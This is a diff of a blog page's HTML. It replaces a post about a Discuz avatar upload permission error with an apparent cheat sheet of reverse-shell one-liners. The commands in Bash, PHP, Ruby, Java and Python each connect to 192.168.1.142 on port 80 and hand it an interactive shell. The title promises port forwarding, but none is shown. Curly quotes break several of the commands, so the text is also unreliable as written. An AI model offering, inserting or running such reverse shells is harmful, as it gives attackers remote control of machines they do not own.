@@ -56,10 +56,10 @@
 </script>
 
 
-        <meta name="keywords" content="website,Discuz,">
-        <meta name="description" content="discuz 不能上传头像提示can not write to the data/tmp folder">
+        <meta name="keywords" content="Hacker,">
+        <meta name="description" content="反弹shell以及端口转发的方法收集">
         <meta name="author" content="Akkuman">
-        <title>discuz 不能上传头像提示can not write to the data/tmp folder</title>
+        <title>反弹shell以及端口转发的方法收集</title>
     </head>
     <body>
         
@@ -115,32 +115,52 @@
                 <div class="row">
                     <div id="main" class="col-12 clearfix" role="main">
                         <article class="posti" itemscope itemtype="http://schema.org/BlogPosting">
-                            <h1 class="post-title" itemprop="name headline">discuz 不能上传头像提示can not write to the data/tmp folder</h1>
+                            <h1 class="post-title" itemprop="name headline">反弹shell以及端口转发的方法收集</h1>
                             <div class="post-meta">
                                 <p>
-                                    Written by <a itemprop="name" href="/about.me.html" rel="author">Akkuman</a> with ♥ on <time datetime="1464710166" itemprop="datePublished"></time> in <a href="/tag/website/index.html">website </a><a href="/tag/Discuz/index.html">Discuz </a>
+                                    Written by <a itemprop="name" href="/about.me.html" rel="author">Akkuman</a> with ♥ on <time datetime="1535011409" itemprop="datePublished"></time> in <a href="/tag/Hacker/index.html">Hacker </a>
                                 </p>
                             </div>
                             <div class="post-content" itemprop="articleBody">
-                                <hr />
+                                <h2>Bash</h2>
 
-<h1>discuz 不能上传头像提示can not write to the data/tmp folder</h1>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1
+</code></pre>
 
-<hr />
+<pre><code class="language-bash">exec 5&lt;&gt;/dev/tcp/192.168.1.142/80
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done 
+# or:
+while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
+</code></pre>
 
-<h2>解释：</h2>
+<h2>PHP</h2>
 
-<p>disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。</p>
+<pre><code class="language-php">php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’
+(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
+</code></pre>
 
-<h2>解决办法：</h2>
+<h2>RUBY</h2>
 
-<p>首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。</p>
+<pre><code class="language-ruby">ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’
+</code></pre>
+
+<h2>JAVA</h2>
+
+<pre><code class="language-java">r = Runtime.getRuntime()
+p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.1.142/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done”] as String[])
+p.waitFor()
+</code></pre>
+
+<h2>PYTHON</h2>
+
+<pre><code class="language-python">python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+</code></pre>
 
                             </div>
                             <div style="display:block;" class="clearfix">
                                 <section style="float:left;">
                                     <span itemprop="keywords" class="tags">
-                                        tag(s): <a href="/tag/website/index.html">website </a><a href="/tag/Discuz/index.html">Discuz </a>
+                                        tag(s): <a href="/tag/Hacker/index.html">Hacker </a>
                                     </span>
                                 </section>
                                 <section style="float:right;">
